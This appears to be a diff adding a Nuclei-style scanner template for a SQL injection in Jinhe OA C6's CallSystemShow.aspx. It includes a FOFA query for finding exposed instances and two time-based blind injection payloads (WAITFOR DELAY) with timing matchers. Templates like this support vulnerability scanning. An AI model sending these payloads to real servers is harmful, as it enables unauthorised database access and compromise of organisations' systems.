@@ -1,0 +1,29 @@
+id: jinhe-oa-callsystemshow-sqli
+info:
+  name: "金和 OA CallSystemShow.aspx SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+      金和网络作为专业信息化服务商，提供组织协同OA系统开发平台及电子政务解决方案。其OA C6版本CallSystemShow.aspx接口存在SQL注入缺陷，攻击者可通过构造恶意SQL语句实现数据库敏感信息读取（如管理员凭证、用户隐私数据），在具备高权限写入能力时可能部署后门程序，达成服务器控制权劫持。
+  tags: 金和OA
+http:
+- raw:
+  - |
+    POST /c6/JHBase.Web.Menu/CallSystemShow.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    MessageID=1');WAITFOR DELAY'0:0:3'--
+  - |
+    POST /c6/JHBase.Web.Menu/CallSystemShow.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    MessageID=1');WAITFOR DELAY'0:0:8'--
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=3 && duration_1<=4
+    - duration_2>=8 && duration_2<=9
+    condition: and
